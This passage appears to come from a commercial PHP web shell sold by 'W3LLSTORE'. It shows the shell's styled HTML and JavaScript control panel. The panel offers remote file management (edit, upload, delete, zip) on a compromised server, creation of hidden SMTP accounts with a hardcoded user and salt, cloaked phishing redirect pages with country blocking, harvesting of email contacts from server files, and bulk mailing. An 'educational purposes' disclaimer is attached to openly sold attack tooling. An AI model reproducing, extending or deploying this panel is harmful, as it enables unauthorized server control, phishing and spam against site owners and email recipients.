            color: var(--text-muted);
            margin-top: 10px;
            text-align: center;
        }
   
        /* ==================== STATS BOX STYLES ==================== */
        .stats-box {
            background: var(--bg-tertiary);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 20px;
            margin-top: 20px;
        }
   
        .stats-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
   
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
   
        .stat-item {
            background: var(--bg-primary);
            padding: 15px;
            border-radius: 8px;
            text-align: center;
        }
        .stat-number {
            font-size: 24px;
            font-weight: 700;
            color: var(--accent-primary);
            margin-bottom: 5px;
        }
        .stat-label {
            font-size: 12px;
            color: var(--text-muted);
            text-transform: uppercase;
        }
        /* ==================== LOADING STYLES ==================== */
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid var(--text-muted);
            border-radius: 50%;
            border-top-color: var(--accent-primary);
            animation: spin 1s ease-in-out infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
        }
        .loading-content {
            background: var(--bg-secondary);
            padding: 30px;
            border-radius: 12px;
            text-align: center;
            border: 1px solid var(--border-color);
        }
        .loading-spinner {
            width: 40px;
            height: 40px;
            border: 4px solid var(--bg-tertiary);
            border-top: 4px solid var(--accent-primary);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        /* ==================== FOOTER STYLES ==================== */
        .footer {
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 16px;
            padding: 25px;
            margin-top: 30px;
            text-align: center;
            box-shadow: var(--shadow-secondary);
        }
        .footer-links {
            display: flex;
            justify-content: center;
            gap: 30px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        .footer-link {
            color: var(--accent-primary);
            text-decoration: none;
            font-weight: 600;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 8px 16px;
            border-radius: 8px;
            border: 1px solid var(--border-color);
            transition: all 0.3s ease;
        }
        .footer-link:hover {
            background: var(--bg-tertiary);
            border-color: var(--accent-primary);
            text-decoration: none;
        }
        .footer-text {
            font-size: 12px;
            color: var(--text-muted);
            line-height: 1.5;
        }
        /* ==================== NOTIFICATION STYLES ==================== */
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 20px;
            max-width: 400px;
            box-shadow: var(--shadow-secondary);
            z-index: 1001;
            transform: translateX(100%);
            transition: transform 0.3s ease;
        }
        .notification.show {
            transform: translateX(0);
        }
        .notification.success {
            border-left: 4px solid var(--accent-success);
        }
        .notification.error {
            border-left: 4px solid var(--accent-danger);
        }
        .notification.warning {
            border-left: 4px solid var(--accent-warning);
        }
        .notification.info {
            border-left: 4px solid var(--accent-primary);
        }
        /* ==================== RESPONSIVE DESIGN ==================== */
        @media (max-width: 768px) {
            .container {
                padding: 15px;
            }
            .header {
                padding: 20px;
            }
            .header h1 {
                font-size: 24px;
            }
            .card {
                padding: 20px;
            }
            .tabs {
                flex-direction: column;
            }
            .tab {
                min-width: auto;
            }
            .system-info {
                grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
                gap: 15px;
            }
            .browser-title {
                flex-direction: column;
                align-items: flex-start;
            }
            .browser-actions {
                width: 100%;
                justify-content: flex-start;
            }
            .file-table th,
            .file-table td {
                padding: 10px 15px;
                font-size: 12px;
            }
            .file-actions {
                flex-direction: column;
                gap: 4px;
            }
            .footer-links {
                flex-direction: column;
                gap: 15px;
            }
            .modal-content {
                padding: 20px;
                margin: 10px;
            }
            .stats-grid {
                grid-template-columns: repeat(2, 1fr);
            }
        }
        /* ==================== SCROLLBAR STYLES ==================== */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }
        ::-webkit-scrollbar-track {
            background: var(--bg-tertiary);
            border-radius: 4px;
        }
        ::-webkit-scrollbar-thumb {
            background: var(--accent-primary);
            border-radius: 4px;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: var(--accent-secondary);
        }
        /* ==================== UTILITY CLASSES ==================== */
        .text-center { text-align: center; }
        .text-left { text-align: left; }
        .text-right { text-align: right; }
        .mb-0 { margin-bottom: 0; }
        .mb-10 { margin-bottom: 10px; }
        .mb-20 { margin-bottom: 20px; }
        .mt-20 { margin-top: 20px; }
        .p-0 { padding: 0; }
        .hidden { display: none; }
        .flex { display: flex; }
        .flex-center { display: flex; align-items: center; justify-content: center; }
        .gap-10 { gap: 10px; }
        .w-full { width: 100%; }
        /* ==================== STATUS STYLES ==================== */
        .status-success { color: var(--accent-success); }
        .status-warning { color: var(--accent-warning); }
        .status-danger { color: var(--accent-danger); }
        .status-info { color: var(--accent-primary); }
        /* ==================== PROGRESS BAR STYLES ==================== */
        .progress-bar {
            width: 100%;
            height: 8px;
            background: var(--bg-tertiary);
            border-radius: 4px;
            overflow: hidden;
            margin: 10px 0;
        }
        .progress-fill {
            height: 100%;
            background: var(--accent-primary);
            border-radius: 4px;
            transition: width 0.3s ease;
        }
        .progress-text {
            font-size: 12px;
            color: var(--text-muted);
            text-align: center;
            margin-top: 5px;
        }
        /* ==================== ANIMATION KEYFRAMES ==================== */
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        @keyframes slideIn {
            from { transform: translateX(-100%); }
            to { transform: translateX(0); }
        }
        @keyframes bounce {
            0%, 20%, 53%, 80%, 100% { transform: translate3d(0,0,0); }
            40%, 43% { transform: translate3d(0, -30px, 0); }
            70% { transform: translate3d(0, -15px, 0); }
            90% { transform: translate3d(0, -4px, 0); }
        }
        .animate-fadeIn { animation: fadeIn 0.5s ease; }
        .animate-slideIn { animation: slideIn 0.3s ease; }
        .animate-bounce { animation: bounce 2s infinite; }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header Section -->
        <div class="header animate-fadeIn">
            <div class="header-content">
                <h1>⚔️ <?= SHELL_NAME ?> v<?= SHELL_VERSION ?></h1>
                <div class="subtitle">Professional Cyber Security Management System | Samurai Japanese Technology Edition</div>
               
                <div class="system-info">
                    <div class="info-item">
                        <div class="label">Server IP</div>
                        <div class="value"><?= $system_info['server_ip'] ?></div>
                    </div>
                    <div class="info-item">
                        <div class="label">Client IP</div>
                        <div class="value"><?= $system_info['client_ip'] ?></div>
                    </div>
                    <div class="info-item">
                        <div class="label">PHP Version</div>
                        <div class="value"><?= $system_info['php_version'] ?></div>
                    </div>
                    <div class="info-item">
                        <div class="label">Operating System</div>
                        <div class="value"><?= $system_info['operating_system'] ?></div>
                    </div>
                    <div class="info-item">
                        <div class="label">Current User</div>
                        <div class="value"><?= $system_info['current_user'] ?></div>
                    </div>
                    <div class="info-item">
                        <div class="label">Server Time</div>
                        <div class="value"><?= $system_info['server_time'] ?></div>
                    </div>
                    <div class="info-item">
                        <div class="label">Disk Free Space</div>
                        <div class="value"><?= $system_info['disk_free_space'] ?></div>
                    </div>
                    <div class="info-item">
                        <div class="label">Memory Limit</div>
                        <div class="value"><?= $system_info['memory_limit'] ?></div>
                    </div>
                </div>
            </div>
        </div>
        <!-- Main Content -->
        <div class="card animate-fadeIn">
            <!-- Tabs Navigation -->
            <div class="tabs">
                <div class="tab active" onclick="switchTab('file-manager')">📁 File Manager</div>
                <div class="tab" onclick="switchTab('smtp-creator')">📧 SMTP Creator</div>
                <div class="tab" onclick="switchTab('redirect-creator')">🔗 Redirect Creator</div>
                <div class="tab" onclick="switchTab('contact-extractor')">📇 Contact Extractor</div>
                <div class="tab" onclick="switchTab('email-marketing')">✉️ Email Marketing</div>
                <div class="tab" onclick="switchTab('shell-validation')">🛡️ Shell Validation</div>
            </div>
            <!-- File Manager Tab -->
            <div id="file-manager" class="tab-content active">
                <div class="card-title">📁 File Manager</div>
               
                <div class="file-browser">
                    <div class="browser-header">
                        <div class="browser-title">
                            <h3>Directory Browser</h3>
                            <div class="browser-actions">
                                <button class="btn btn-sm" onclick="showModal('create-file-modal')">📄 New File</button>
                                <button class="btn btn-sm" onclick="showModal('create-folder-modal')">📁 New Folder</button>
                                <button class="btn btn-sm" onclick="showModal('upload-modal')">⬆️ Upload</button>
                            </div>
                        </div>
                        <div class="breadcrumb">
                            📍 Current Directory:
                            <a href="?dir=<?= urlencode(dirname($current_dir)) ?>"><?= htmlspecialchars($current_dir) ?></a>
                        </div>
                    </div>
                   
                    <div class="file-table-container">
                        <table class="file-table">
                            <thead>
                                <tr>
                                    <th>Name</th>
                                    <th>Size</th>
                                    <th>Permissions</th>
                                    <th>Modified</th>
                                    <th>Actions</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php if ($current_dir !== '/' && dirname($current_dir) !== $current_dir): ?>
                                <tr>
                                    <td>
                                        <a href="?dir=<?= urlencode(dirname($current_dir)) ?>" class="file-name">
                                            <span class="file-icon">📁</span>
                                            <span>.. (Parent Directory)</span>
                                        </a>
                                    </td>
                                    <td>-</td>
                                    <td>-</td>
                                    <td>-</td>
                                    <td>-</td>
                                </tr>
                                <?php endif; ?>
                               
                                <?php foreach ($files as $file): ?>
                                <tr>
                                    <td>
                                        <?php if ($file['is_dir']): ?>
                                            <a href="?dir=<?= urlencode($file['path']) ?>" class="file-name">
                                                <span class="file-icon"><?= $file['icon'] ?></span>
                                                <span><?= htmlspecialchars($file['name']) ?></span>
                                            </a>
                                        <?php else: ?>
                                            <div class="file-name">
                                                <span class="file-icon"><?= $file['icon'] ?></span>
                                                <span><?= htmlspecialchars($file['name']) ?></span>
                                            </div>
                                        <?php endif; ?>
                                    </td>
                                    <td><?= $file['formatted_size'] ?></td>
                                    <td><?= $file['permissions'] ?></td>
                                    <td><?= $file['modified'] ?></td>
                                    <td>
                                        <div class="file-actions">
                                            <?php if (!$file['is_dir']): ?>
                                                <button class="btn btn-sm btn-secondary" onclick="editFile('<?= htmlspecialchars(addslashes($file['path'])) ?>')">✏️ Edit</button>
                                                <button class="btn btn-sm btn-secondary" onclick="downloadFile('<?= htmlspecialchars(addslashes($file['path'])) ?>')">⬇️ Download</button>
                                            <?php endif; ?>
                                            <button class="btn btn-sm btn-warning" onclick="zipItem('<?= htmlspecialchars(addslashes($file['path'])) ?>')">📦 Zip</button>
                                            <?php if (strtolower(pathinfo($file['name'], PATHINFO_EXTENSION)) === 'zip'): ?>
                                                <button class="btn btn-sm btn-success" onclick="unzipFile('<?= htmlspecialchars(addslashes($file['path'])) ?>')">📂 Unzip</button>
                                            <?php endif; ?>
                                            <button class="btn btn-sm btn-danger" onclick="deleteItem('<?= htmlspecialchars(addslashes($file['path'])) ?>', '<?= htmlspecialchars(addslashes($file['name'])) ?>')">🗑️ Delete</button>
                                        </div>
                                    </td>
                                </tr>
                                <?php endforeach; ?>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
            <!-- SMTP Creator Tab -->
            <div id="smtp-creator" class="tab-content">
                <div class="card-title">📧 SMTP Creator - 100% Reference Method</div>
               
                <!-- Single SMTP Creator Section -->
                <div class="smtp-creator-section">
                    <h4>⚡ Single SMTP Creator (Exact Reference Method)</h4>
                    <p style="margin: 10px 0; color: var(--text-secondary);">
                        Creates SMTP account using 100% exact same method as your reference code:<br>
                        • Username: chudsi (hardcoded)<br>
                        • Encryption: $6$the3x$ (exact salt)<br>
                        • UID: 16249 (exact UID)<br>
                        • Password prefix: w3ll.smtp + random 3 digits
                    </p>
                    <button onclick="createSingleSMTP()" class="btn">⚡ Create Single SMTP Account</button>
                    <div class="smtp-info">Uses exactly the same method as your reference code - no modifications</div>
                </div>
                <div id="smtp-results" class="result-box" style="display: none;">
                    <div class="result-header">
                        <h4>📧 SMTP Results</h4>
                        <button class="btn btn-sm" onclick="copyResults('smtp-output')">📋 Copy All</button>
                    </div>
                    <pre id="smtp-output"></pre>
                </div>
            </div>
            <!-- Redirect Creator Tab -->
            <div id="redirect-creator" class="tab-content">
                <div class="card-title">🔗 Auto Redirect Creator with Professional Company Style</div>
               
                <form id="redirect-form">
                    <div class="form-group">
                        <label for="target-url">Target URL:</label>
                        <input type="url" id="target-url" class="form-control" required placeholder="https://example.com">
                    </div>
                   
                    <div class="grid grid-2">
                        <div class="form-group">
                            <label for="custom-message">Custom Message:</label>
                            <input type="text" id="custom-message" class="form-control" value="Please wait..." placeholder="Loading message">
                        </div>
                       
                        <div class="form-group">
                            <label for="delay">Redirect Delay (milliseconds):</label>
                            <input type="number" id="delay" class="form-control" value="5000" min="1000" max="30000" placeholder="5000">
                        </div>
                    </div>
                   
                    <div class="form-group">
                        <label for="blocked-countries">Blocked Countries (comma separated):</label>
                        <input type="text" id="blocked-countries" class="form-control" placeholder="ID,US,UK (country codes)">
                    </div>
                   
                    <div class="form-group">
                        <label>
                            <input type="checkbox" id="use-captcha"> Enable Professional Company Style Captcha Protection
                        </label>
                    </div>
                   
                    <button type="submit" class="btn">🚀 Create Redirect Files (PHP, PHP7, HTML)</button>
                </form>
                <div id="redirect-results" class="result-box" style="display: none;">
                    <div class="result-header">
                        <h4>🔗 Redirect Results</h4>
                        <div>
                            <button class="btn btn-sm" onclick="copyResults('redirect-output')">📋 Copy All</button>
                            <button class="btn btn-sm btn-secondary" onclick="showRedirectStats()">📊 View Stats</button>
                        </div>
                    </div>
                    <pre id="redirect-output"></pre>
                </div>
                <div id="redirect-stats" class="stats-box" style="display: none;">
                    <div class="stats-header">
                        <h4>📊 Visitor Statistics (Advanced Session Storage)</h4>
                        <button class="btn btn-sm" onclick="refreshStats()">🔄 Refresh</button>
                    </div>
                    <div class="stats-grid">
                        <div class="stat-item">
                            <div class="stat-number" id="total-visits">0</div>
                            <div class="stat-label">Total Visits</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-number" id="unique-visits">0</div>
                            <div class="stat-label">Unique Visits</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-number" id="total-redirects">0</div>
                            <div class="stat-label">Successful Redirects</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-number" id="conversion-rate">0%</div>
                            <div class="stat-label">Conversion Rate</div>
                        </div>
                    </div>
                    <div id="detailed-stats"></div>
                </div>
            </div>
            <!-- Contact Extractor Tab -->
            <div id="contact-extractor" class="tab-content">
                <div class="card-title">📇 Contact Extractor</div>
               
                <form id="extract-form">
                    <div class="form-group">
                        <label for="scan-path">Scan Path:</label>
                        <input type="text" id="scan-path" class="form-control" value="<?= htmlspecialchars($current_dir) ?>" placeholder="Path to scan for contacts">
                    </div>
                   
                    <div class="form-group">
                        <label for="max-files">Maximum Files to Scan:</label>
                        <input type="number" id="max-files" class="form-control" value="3000" min="100" max="10000" placeholder="3000">
                    </div>
                   
                    <button type="submit" class="btn">🔍 Extract Contacts</button>
                </form>
                <div id="extract-results" class="result-box" style="display: none;">
                    <div class="result-header">
                        <h4>📇 Extraction Results</h4>
                        <button class="btn btn-sm" onclick="copyResults('extract-output')">📋 Copy All</button>
                    </div>
                    <pre id="extract-output"></pre>
                </div>
            </div>
            <!-- Email Marketing Tab -->
            <div id="email-marketing" class="tab-content">
                <div class="card-title">✉️ Email Marketing</div>
               
                <form id="email-form">
                    <div class="grid grid-2">
                        <div class="form-group">
                            <label for="email-from-name">From Name:</label>
                            <input type="text" id="email-from-name" class="form-control" required placeholder="Your Name">
                        </div>
                       
                        <div class="form-group">
                            <label for="email-from-email">From Email:</label>
                            <input type="email" id="email-from-email" class="form-control" required placeholder="your@email.com">
                        </div>
                    </div>
                   
                    <div class="form-group">
                        <label for="email-subject">Subject:</label>
                        <input type="text" id="email-subject" class="form-control" required placeholder="Email subject">
                    </div>
                   
                    <div class="form-group">
                        <label for="email-message">Message (HTML supported):</label>
                        <textarea id="email-message" class="form-control" rows="8" required placeholder="Your email message here..."></textarea>
                    </div>
                   
                    <div class="form-group">
                        <label for="email-list">Email List (one per line):</label>
                        <textarea id="email-list" class="form-control" rows="10" required placeholder="email1@example.com&#10;email2@example.com&#10;email3@example.com"></textarea>
                    </div>
                   
                    <div class="form-group">
                        <label>
                            <input type="checkbox" id="use-custom-smtp-email"> Use Custom SMTP (otherwise use server hosting direct send with limits)
                        </label>
                    </div>
                   
                    <div id="smtp-config-email" style="display: none;">
                        <div class="grid grid-2">
                            <div class="form-group">
                                <label for="smtp-host-email">SMTP Host:</label>
                                <input type="text" id="smtp-host-email" class="form-control" placeholder="smtp.gmail.com">
                            </div>
                           
                            <div class="form-group">
                                <label for="smtp-port-email">SMTP Port:</label>
                                <input type="number" id="smtp-port-email" class="form-control" value="587" placeholder="587">
                            </div>
                        </div>
                       
                        <div class="grid grid-2">
                            <div class="form-group">
                                <label for="smtp-username-email">SMTP Username:</label>
                                <input type="text" id="smtp-username-email" class="form-control" placeholder="your@email.com">
                            </div>
                           
                            <div class="form-group">
                                <label for="smtp-password-email">SMTP Password:</label>
                                <input type="password" id="smtp-password-email" class="form-control" placeholder="Your password">
                            </div>
                        </div>
                    </div>
                   
                    <button type="submit" class="btn">🚀 Send Email Campaign</button>
                </form>
                <div id="email-results" class="result-box" style="display: none;">
                    <div class="result-header">
                        <h4>✉️ Email Campaign Results</h4>
                        <button class="btn btn-sm" onclick="copyResults('email-output')">📋 Copy Results</button>
                    </div>
                    <pre id="email-output"></pre>
                </div>
            </div>
            <!-- Shell Validation Tab -->
            <div id="shell-validation" class="tab-content">
                <div class="card-title">🛡️ Shell Validation System</div>
               
                <div class="mb-20">
                    <h4>🔍 Validation Features:</h4>
                    <div class="grid grid-3">
                        <div class="info-item">
                            <div class="label">Server Information</div>
                            <div class="value">Complete system details</div>
                        </div>
                        <div class="info-item">
                            <div class="label">ZIP Functionality</div>
                            <div class="value">Archive creation test</div>
                        </div>
                        <div class="info-item">
                            <div class="label">Email Delivery</div>
                            <div class="value">SMTP capability test</div>
                        </div>
                    </div>
                </div>
               
                <form id="validation-form">
                    <div class="form-group">
                        <label for="validation-email">Your Email (for test delivery):</label>
                        <input type="email" id="validation-email" class="form-control" required placeholder="your@email.com">
                    </div>
                   
                    <div class="form-group">
                        <label for="validation-id">Validation ID:</label>
                        <input type="number" id="validation-id" class="form-control" required placeholder="Enter validation ID" value="<?= mt_rand(1000, 9999) ?>">
                    </div>
                   
                    <button type="submit" class="btn">🔍 Run Validation</button>
                </form>
                <div id="validation-results" class="result-box" style="display: none;">
                    <div class="result-header">
                        <h4>🛡️ Validation Results</h4>
                        <button class="btn btn-sm" onclick="copyResults('validation-output')">📋 Copy Results</button>
                    </div>
                    <pre id="validation-output"></pre>
                </div>
            </div>
        </div>
        <!-- Footer -->
        <div class="footer">
            <div class="footer-links">
                <a href="https://w3llstore.com/" target="_blank" class="footer-link">
                    🌐 W3LLSTORE Website
                </a>
                <a href="https://t.me/W3LLSTORE_ADMIN" target="_blank" class="footer-link">
                    📞 Contact Admin
                </a>
                <a href="https://t.me/+vJV6tnAIbIU2ZWRi" target="_blank" class="footer-link">
                    📢 Join Channel
                </a>
                <a href="mailto:admin@w3llstore.com" class="footer-link">
                    ✉️ Email Support
                </a>
            </div>
            <div class="footer-text">
                © 2024 W3LLSTORE Team | Professional Cyber Security Solutions<br>
                Samurai Japanese Technology Edition | For Educational & Security Testing Purposes Only
            </div>
        </div>
    </div>
    <!-- Modals -->
   
    <!-- Create File Modal -->
    <div id="create-file-modal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 class="modal-title">📄 Create New File</h3>
                <button class="modal-close" onclick="hideModal('create-file-modal')">&times;</button>
            </div>
            <form id="create-file-form">
                <div class="form-group">
                    <label for="new-filename">File Name:</label>
                    <input type="text" id="new-filename" class="form-control" required placeholder="example.txt">
                </div>
                <div class="form-group">
                    <label for="new-file-content">File Content:</label>
                    <textarea id="new-file-content" class="form-control" rows="10" placeholder="Enter file content here..."></textarea>
                </div>
                <div class="flex gap-10">
                    <button type="submit" class="btn">📄 Create File</button>
                    <button type="button" class="btn btn-secondary" onclick="hideModal('create-file-modal')">Cancel</button>
                </div>
            </form>
        </div>
    </div>
    <!-- Create Folder Modal -->
    <div id="create-folder-modal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 class="modal-title">📁 Create New Folder</h3>
                <button class="modal-close" onclick="hideModal('create-folder-modal')">&times;</button>
            </div>
            <form id="create-folder-form">
                <div class="form-group">
                    <label for="new-foldername">Folder Name:</label>
                    <input type="text" id="new-foldername" class="form-control" required placeholder="new-folder">
                </div>
                <div class="flex gap-10">
                    <button type="submit" class="btn">📁 Create Folder</button>
                    <button type="button" class="btn btn-secondary" onclick="hideModal('create-folder-modal')">Cancel</button>
                </div>
            </form>
        </div>
    </div>
    <!-- Upload Modal -->
    <div id="upload-modal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 class="modal-title">⬆️ Upload File</h3>
                <button class="modal-close" onclick="hideModal('upload-modal')">&times;</button>
            </div>
            <form id="upload-form" enctype="multipart/form-data">
                <div class="form-group">
                    <label for="upload-file">Select File:</label>
                    <input type="file" id="upload-file" name="upload_file" class="form-control" required>
                </div>
                <div class="form-group">
                    <div class="progress-bar">
                        <div class="progress-fill" id="upload-progress"></div>
                    </div>
                    <div class="progress-text" id="upload-text">Ready to upload</div>
                </div>
                <div class="flex gap-10">
                    <button type="submit" class="btn">⬆️ Upload File</button>
                    <button type="button" class="btn btn-secondary" onclick="hideModal('upload-modal')">Cancel</button>
                </div>
            </form>
        </div>
    </div>
    <!-- Edit File Modal -->
    <div id="edit-file-modal" class="modal">
        <div class="modal-content" style="max-width: 1000px;">
            <div class="modal-header">
                <h3 class="modal-title">✏️ Edit File: <span id="edit-filename"></span></h3>
                <button class="modal-close" onclick="hideModal('edit-file-modal')">&times;</button>
            </div>
            <form id="edit-file-form">
                <div class="form-group">
                    <label for="edit-file-content">File Content:</label>
                    <textarea id="edit-file-content" class="form-control" rows="20" style="font-family: 'Courier New', monospace; font-size: 13px;"></textarea>
                </div>
                <div class="flex gap-10">
                    <button type="submit" class="btn">💾 Save Changes</button>
                    <button type="button" class="btn btn-secondary" onclick="hideModal('edit-file-modal')">Cancel</button>
                </div>
                <input type="hidden" id="edit-filepath" value="">
            </form>
        </div>
    </div>
    <!-- Loading Overlay -->
    <div id="loading-overlay" class="loading-overlay" style="display: none;">
        <div class="loading-content">
            <div class="loading-spinner"></div>
            <div id="loading-text">Processing...</div>
        </div>
    </div>
    <!-- JavaScript -->
    <script>
        // ==================== GLOBAL VARIABLES ====================
        let currentTab = 'file-manager';
        let currentRedirectId = null;
        // ==================== TAB MANAGEMENT ====================
        function switchTab(tabId) {
            // Hide all tab contents
            const tabContents = document.querySelectorAll('.tab-content');
            tabContents.forEach(content => content.classList.remove('active'));
           
            // Remove active class from all tabs
            const tabs = document.querySelectorAll('.tab');
            tabs.forEach(tab => tab.classList.remove('active'));
           
            // Show selected tab content
            document.getElementById(tabId).classList.add('active');
           
            // Add active class to selected tab
            event.target.classList.add('active');
           
            currentTab = tabId;
        }
        // ==================== MODAL MANAGEMENT ====================
        function showModal(modalId) {
            document.getElementById(modalId).classList.add('active');
            document.body.style.overflow = 'hidden';
        }
        function hideModal(modalId) {
            document.getElementById(modalId).classList.remove('active');
            document.body.style.overflow = 'auto';
        }
        // Close modal when clicking outside
        document.addEventListener('click', function(e) {
            if (e.target.classList.contains('modal')) {
                hideModal(e.target.id);
            }
        });
        // ==================== LOADING MANAGEMENT ====================
        function showLoading(text = 'Processing...') {
            document.getElementById('loading-text').textContent = text;
            document.getElementById('loading-overlay').style.display = 'flex';
        }
        function hideLoading() {
            document.getElementById('loading-overlay').style.display = 'none';
        }
        // ==================== NOTIFICATION SYSTEM ====================
        function showNotification(message, type = 'info') {
            const notification = document.createElement('div');
            notification.className = `notification ${type}`;
            notification.innerHTML = `
                <div style="display: flex; justify-content: space-between; align-items: center;">
                    <span>${message}</span>
                    <button onclick="this.parentElement.parentElement.remove()" style="background: none; border: none; color: var(--text-muted); cursor: pointer; font-size: 18px; padding: 0 5px;">&times;</button>
                </div>
            `;
           
            document.body.appendChild(notification);
           
            // Show notification
            setTimeout(() => notification.classList.add('show'), 100);
           
            // Auto remove after 5 seconds
            setTimeout(() => {
                notification.classList.remove('show');
                setTimeout(() => notification.remove(), 300);
            }, 5000);
        }
        // ==================== UTILITY FUNCTIONS ====================
        function copyResults(elementId) {
            const element = document.getElementById(elementId);
            if (element) {
                navigator.clipboard.writeText(element.textContent).then(() => {
                    showNotification('Results copied to clipboard!', 'success');
                }).catch(() => {
                    // Fallback for older browsers
                    const textArea = document.createElement('textarea');
                    textArea.value = element.textContent;
                    document.body.appendChild(textArea);
                    textArea.select();
                    document.execCommand('copy');
                    document.body.removeChild(textArea);
                    showNotification('Results copied to clipboard!', 'success');
                });
            }
        }
        function formatFileSize(bytes) {
            if (bytes === 0) return '0 Bytes';
            const k = 1024;
            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
        }
        // ==================== AJAX HELPER ====================
        function makeRequest(url, method, data, callback, errorCallback) {
            const xhr = new XMLHttpRequest();
            xhr.open(method, url, true);
           
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    hideLoading();
                    if (xhr.status === 200) {
                        try {
                            const response = JSON.parse(xhr.responseText);
                            callback(response);
                        } catch (e) {
                            callback({status: false, message: 'Invalid server response'});
                        }
                    } else {
                        if (errorCallback) {
                            errorCallback('Network error: ' + xhr.status);
                        } else {
                            showNotification('Network error: ' + xhr.status, 'error');
                        }
                    }
                }
            };
           
            if (method === 'POST' && !(data instanceof FormData)) {
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                const formData = new URLSearchParams(data).toString();
                xhr.send(formData);
            } else {
                xhr.send(data);
            }
        }
        // ==================== SMTP CREATOR FUNCTIONS ====================
        function createSingleSMTP() {
            showLoading('Creating SMTP account using exact reference method...');
           
            makeRequest('', 'POST', {action: 'create_single_smtp'}, function(response) {
                const resultsDiv = document.getElementById('smtp-results');
                const outputDiv = document.getElementById('smtp-output');
               
                if (response.status) {
                    outputDiv.textContent = response.smtp_data || response.message;
                    showNotification('SMTP account created successfully!', 'success');
                } else {
                    outputDiv.textContent = response.message || 'Failed to create SMTP account';
                    showNotification('Failed to create SMTP account', 'error');
                }
               
                resultsDiv.style.display = 'block';
            });
        }
        // ==================== REDIRECT CREATOR FUNCTIONS ====================
        document.getElementById('redirect-form').addEventListener('submit', function(e) {
            e.preventDefault();
           
            const targetUrl = document.getElementById('target-url').value;
            const customMessage = document.getElementById('custom-message').value;
            const delay = document.getElementById('delay').value;
            const blockedCountries = document.getElementById('blocked-countries').value;
            const useCaptcha = document.getElementById('use-captcha').checked;
           
            if (!targetUrl) {
                showNotification('Please enter a target URL', 'warning');
                return;
            }
           
            showLoading('Creating redirect files...');
           
            const data = {
                action: 'create_redirect',
                target_url: targetUrl,
                custom_message: customMessage,
                delay: delay,
                blocked_countries: blockedCountries,
                use_captcha: useCaptcha
            };
           
            makeRequest('', 'POST', data, function(response) {
                const resultsDiv = document.getElementById('redirect-results');
                const outputDiv = document.getElementById('redirect-output');
               
                if (response.status) {
                    let output = `✅ Redirect files created successfully!\n\n`;
                    output += `📁 Files created:\n`;
                    output += `• ${response.redirect_id}.php (PHP version)\n`;
                    output += `• ${response.redirect_id}_php7.php (PHP7 version)\n`;
                    output += `• ${response.redirect_id}.html (HTML version)\n\n`;
                    output += `🔗 Access URLs:\n`;
                    output += `• ${window.location.origin}${window.location.pathname.replace(/[^/]*$/, '')}${response.redirect_id}.php\n`;
                    output += `• ${window.location.origin}${window.location.pathname.replace(/[^/]*$/, '')}${response.redirect_id}_php7.php\n`;
                    output += `• ${window.location.origin}${window.location.pathname.replace(/[^/]*$/, '')}${response.redirect_id}.html\n\n`;
                    output += `📊 Statistics file: ${response.redirect_id}_stats.json\n`;
                    output += `🎯 Target URL: ${targetUrl}\n`;
                    output += `⏱️ Delay: ${delay}ms\n`;
                    output += `🚫 Blocked countries: ${blockedCountries || 'None'}\n`;
                    output += `🛡️ Captcha protection: ${useCaptcha ? 'Enabled' : 'Disabled'}`;
                   
                    outputDiv.textContent = output;
                    currentRedirectId = response.redirect_id;
                    showNotification('Redirect files created successfully!', 'success');
                } else {
                    outputDiv.textContent = response.message || 'Failed to create redirect files';
                    showNotification('Failed to create redirect files', 'error');
                }
               
                resultsDiv.style.display = 'block';
            });
        });
        function showRedirectStats() {
            if (!currentRedirectId) {
                showNotification('No redirect ID available', 'warning');
                return;
            }
           
            showLoading('Loading statistics...');
           
            makeRequest('', 'POST', {
                action: 'get_redirect_stats',
                redirect_id: currentRedirectId
            }, function(response) {
                if (response.status && response.stats) {
                    const stats = response.stats;
                   
                    document.getElementById('total-visits').textContent = stats.total_visits || 0;
                    document.getElementById('unique-visits').textContent = stats.unique_visits || 0;
                    document.getElementById('total-redirects').textContent = stats.redirects || 0;
                    document.getElementById('conversion-rate').textContent = stats.conversion_rate + '%' || '0%';
                   
                    // Show detailed stats
                    let detailedHtml = '<h5>📈 Daily Statistics:</h5>';
                    if (stats.daily_stats && Object.keys(stats.daily_stats).length > 0) {
                        detailedHtml += '<div class="grid grid-3" style="margin-top: 15px;">';
                        Object.entries(stats.daily_stats).slice(-7).forEach(([date, data]) => {
                            detailedHtml += `
                                <div class="info-item">
                                    <div class="label">${date}</div>
                                    <div class="value">Visits: ${data.visits}, Redirects: ${data.redirects}</div>
                                </div>
